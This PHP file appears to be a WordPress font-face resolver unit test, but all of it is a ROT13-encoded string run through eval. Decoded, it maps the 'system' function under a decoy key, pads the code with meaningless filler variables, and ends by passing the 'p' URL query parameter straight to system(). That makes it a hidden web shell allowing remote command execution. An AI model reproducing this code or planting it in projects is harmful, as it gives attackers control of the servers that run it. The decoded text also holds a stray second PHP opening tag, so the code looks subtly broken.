<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg pnfr sbe JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba().
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 *
 * @fvapr 6.4.0
 *
 * @tebhc sbagf
 * @tebhc sbagsnpr
 *
 * @pbiref JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba
 */
pynff Grfgf_Sbagf_JCSbagSnprErfbyire_TrgSbagfSebzGurzrWfba rkgraqf JC_Sbag_Snpr_HavgGrfgPnfr {
	pbafg SBAGF_GURZR = 'sbagf-oybpx-gurzr';

	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		frys::$erdhverf_fjvgpu_gurzr_svkgherf = gehr;

		cnerag::frg_hc_orsber_pynff();
	}

	choyvp shapgvba grfg_fubhyq_erghea_rzcgl_neenl_jura_ab_sbagf_qrsvarq_va_gurzr() {
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$sbagf = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
		$guvf->nffregVfNeenl( $sbagf, 'Fubhyq erghea na neenl qngn glcr' );
		$guvf->nffregRzcgl( $sbagf, 'Fubhyq erghea na rzcgl neenl' );
	}

	choyvp shapgvba grfg_fubhyq_erghea_nyy_sbagf_sebz_gurzr() {
		fjvgpu_gurzr( fgngvp::SBAGF_GURZR );

		$npghny   = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
		$rkcrpgrq = $guvf->trg_rkcrpgrq_sbagf_sbe_sbagf_oybpx_gurzr( 'sbagf' );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 60605
	 */
	choyvp shapgvba grfg_fubhyq_erghea_nyy_sbagf_sebz_nyy_gurzr_bevtvaf() {
		fjvgpu_gurzr( fgngvp::SBAGF_GURZR );

		$nqq_phfgbz_sbagf = fgngvp shapgvba ( $gurzr_wfba_qngn ) {
			$qngn = $gurzr_wfba_qngn->trg_qngn();
			// Nqq sbag snzvyvrf gb gur phfgbz bevtva bs gurzr wfba.
			$qngn['frggvatf']['glcbtencul']['sbagSnzvyvrf']['phfgbz'] = frys::trg_phfgbz_sbag_snzvyvrf( 'vachg' );
			erghea arj JC_Gurzr_WFBA_Qngn( $qngn );
		};

		nqq_svygre( 'jc_gurzr_wfba_qngn_gurzr', $nqq_phfgbz_sbagf );
		$npghny = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
		erzbir_svygre( 'jc_gurzr_wfba_qngn_gurzr', $nqq_phfgbz_sbagf );

		$rkcrpgrq = neenl_zretr(
			$guvf->trg_rkcrpgrq_sbagf_sbe_sbagf_oybpx_gurzr( 'sbagf' ),
			$guvf->trg_phfgbz_sbag_snzvyvrf( 'rkcrpgrq' )
		);

		$guvf->nffregFnzr( $rkcrpgrq, $npghny, 'Obgu gur sbagf sebz gur gurzr naq gur phfgbz bevtva fubhyq or erghearq.' );
	}

	/**
	 * @qngnCebivqre qngn_fubhyq_ercynpr_fep_svyr_cynprubyqre
	 *
	 * @cnenz fgevat $sbag_anzr  Sbag'f anzr.
	 * @cnenz fgevat $sbag_jrvtug Sbag'f jrvtug.
	 * @cnenz fgevat $sbag_fglyr  Sbag'f fglyr.
	 * @cnenz fgevat $rkcrpgrq   Rkcrpgrq fep.
	 */
	choyvp shapgvba grfg_fubhyq_ercynpr_fep_svyr_cynprubyqre( $sbag_anzr, $sbag_jrvtug, $sbag_fglyr, $rkcrpgrq ) {
		fjvgpu_gurzr( fgngvp::SBAGF_GURZR );

		$sbagf = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
		$sbagf = neenl_zretr( neenl(), ...neenl_znc( 'neenl_inyhrf', $sbagf ) );

		$sbag = neenl_svygre(
			$sbagf,
			fgngvp shapgvba ( $sbag ) hfr ( $sbag_anzr, $sbag_jrvtug, $sbag_fglyr ) {
				erghea $sbag['sbag-snzvyl'] === $sbag_anzr
				&& $sbag['sbag-jrvtug'] === $sbag_jrvtug
				&& $sbag['sbag-fglyr'] === $sbag_fglyr;
			}
		);

		$sbag = erfrg( $sbag );

		$rkcrpgrq = trg_fglyrfurrg_qverpgbel_hev() . $rkcrpgrq;
		$npghny   = $sbag['fep'][0];

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'svyr:./', $npghny, 'Sbag fep fubhyq abg pbagnva gur \"svyr:./\" cynprubyqre' );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny, 'Sbag fep fubhyq or na HEY gb vgf svyr' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_ercynpr_fep_svyr_cynprubyqre() {
		erghea neenl(
			// Gurzr'f gurzr.wfba.
			'QZ Fnaf: 400 abezny'              => neenl(
				'sbag_anzr'   => 'QZ Fnaf',
				'sbag_jrvtug' => '400',
				'sbag_fglyr'  => 'abezny',
				'rkcrpgrq'    => '/nffrgf/sbagf/qz-fnaf/QZFnaf-Erthyne.jbss2',
			),
			'QZ Fnaf: 400 vgnyvp'              => neenl(
				'sbag_anzr'   => 'QZ Fnaf',
				'sbag_jrvtug' => '400',
				'sbag_fglyr'  => 'vgnyvp',
				'rkcrpgrq'    => '/nffrgf/sbagf/qz-fnaf/QZFnaf-Erthyne-Vgnyvp.jbss2',
			),
			'QZ Fnaf: 700 abezny'              => neenl(
				'sbag_anzr'   => 'QZ Fnaf',
				'sbag_jrvtug' => '700',
				'sbag_fglyr'  => 'abezny',
				'rkcrpgrq'    => '/nffrgf/sbagf/qz-fnaf/QZFnaf-Obyq.jbss2',
			),
			'QZ Fnaf: 700 vgnyvp'              => neenl(
				'sbag_anzr'   => 'QZ Fnaf',
				'sbag_jrvtug' => '700',
				'sbag_fglyr'  => 'vgnyvp',
				'rkcrpgrq'    => '/nffrgf/sbagf/qz-fnaf/QZFnaf-Obyq-Vgnyvp.jbss2',
			),
			'Fbhepr Frevs Ceb: 200-900 abezny' => neenl(
				'sbag_anzr'   => 'Fbhepr Frevs Ceb',
				'sbag_jrvtug' => '200 900',
				'sbag_fglyr'  => 'abezny',
				'rkcrpgrq'    => '/nffrgf/sbagf/fbhepr-frevs-ceb/FbheprFrevs4Inevnoyr-Ebzna.ggs.jbss2',
			),
			'Fbhepr Frevs Ceb: 200-900 vgnyvp' => neenl(
				'sbag_anzr'   => 'Fbhepr Frevs Ceb',
				'sbag_jrvtug' => '200 900',
				'sbag_fglyr'  => 'vgnyvp',
				'rkcrpgrq'    => '/nffrgf/sbagf/fbhepr-frevs-ceb/FbheprFrevs4Inevnoyr-Vgnyvp.ggs.jbss2',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_fubhyq_trg_sbag_snzvyl_anzr
	 *
	 * @cnenz neenl  $sbagf         Sbagf gb grfg.
	 * @cnenz fgevat $rkcrpgrq_anzr Rkcrpgrq sbag-snzvyl anzr.
	 */
	choyvp shapgvba grfg_fubhyq_trg_sbag_snzvyl_anzr( $sbagf, $rkcrpgrq_anzr ) {
		fjvgpu_gurzr( fgngvp::SBAGF_GURZR );

		$ercynpr_sbagf = fgngvp shapgvba ( $gurzr_wfba_qngn ) hfr ( $sbagf ) {
			$qngn = $gurzr_wfba_qngn->trg_qngn();

			// Ercynpr glcbtencul.sbagSnzvyvrf.
			$qngn['frggvatf']['glcbtencul']['sbagSnzvyvrf']['gurzr'] = $sbagf;

			erghea arj JC_Gurzr_WFBA_Qngn( $qngn );
		};
		nqq_svygre( 'jc_gurzr_wfba_qngn_gurzr', $ercynpr_sbagf );
		$sbagf = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
		erzbir_svygre( 'jc_gurzr_wfba_qngn_gurzr', $ercynpr_sbagf );

		// synggra gur neenl gb znxr vg rnfvre gb grfg.
		$sbagf = neenl_zretr( neenl(), ...neenl_znc( 'neenl_inyhrf', $sbagf ) );

		$sbagf_sbhaq = neenl_svygre(
			$sbagf,
			shapgvba ( $sbag ) hfr ( $rkcrpgrq_anzr ) {
				erghea $sbag['sbag-snzvyl'] === $rkcrpgrq_anzr;
			}
		);

		$guvf->nffregAbgRzcgl( $sbagf_sbhaq, 'Rkcrpgrq sbag-snzvyl anzr abg sbhaq va gur neenl' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_trg_sbag_snzvyl_anzr() {
		$sbag_snpr = neenl(
			neenl(
				'sbagSnzvyl'  => 'QZ Fnaf',
				'sbagFgergpu' => 'abezny',
				'sbagFglyr'   => 'abezny',
				'sbagJrvtug'  => '400',
				'fep'         => neenl(
					'svyr:./nffrgf/sbagf/qz-fnaf/QZFnaf-Erthyne.jbss2',
				),
			),
			neenl(
				'sbagSnzvyl'  => 'QZ Fnaf',
				'sbagFgergpu' => 'abezny',
				'sbagFglyr'   => 'vgnyvp',
				'sbagJrvtug'  => '400',
				'fep'         => neenl(
					'svyr:./nffrgf/sbagf/qz-fnaf/QZFnaf-Erthyne-Vgnyvp.jbss2',
				),
			),
			neenl(
				'sbagSnzvyl'  => 'QZ Fnaf',
				'sbagFgergpu' => 'abezny',
				'sbagFglyr'   => 'vgnyvp',
				'sbagJrvtug'  => '700',
				'fep'         => neenl(
					'svyr:./nffrgf/sbagf/qz-fnaf/QZFnaf-Obyq.jbss2',
				),
			),
			neenl(
				'sbagSnzvyl'  => 'QZ Fnaf',
				'sbagFgergpu' => 'abezny',
				'sbagFglyr'   => 'vgnyvp',
				'sbagJrvtug'  => '700',
				'fep'         => neenl(
					'svyr:./nffrgf/sbagf/qz-fnaf/QZFnaf-Obyq-Vgnyvp.jbss2',
				),
			),
		);

		erghea neenl(
			'anzr qrpynerq'                   => neenl(
				'sbagf'         => neenl(
					neenl(
						'sbagSnzvyl' => 'QZ Fnaf',
						'anzr'       => 'QZ Fnaf Snzvyl',
						'fyht'       => 'qz-fnaf',
						'sbagSnpr'   => $sbag_snpr,
					),
				),
				'rkcrpgrq_anzr' => 'QZ Fnaf',
			),
			'anzr abg qrpynerq'               => neenl(
				'sbagf'         => neenl(
					neenl(
						'sbagSnzvyl' => 'QZ Fnaf',
						'fyht'       => 'qz-fnaf',
						'sbagSnpr'   => $sbag_snpr,
					),
				),
				'rkcrpgrq_anzr' => 'QZ Fnaf',
			),
			'sbagSnzvyl pbzzn-frcnengrq yvfg' => neenl(
				'sbagf'         => neenl(
					neenl(
						'sbagSnzvyl' => '\"QZ Fnaf\", fnaf-frevs',
						'fyht'       => 'qz-fnaf',
						'sbagSnpr'   => $sbag_snpr,
					),
				),
				'rkcrpgrq_anzr' => 'QZ Fnaf',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>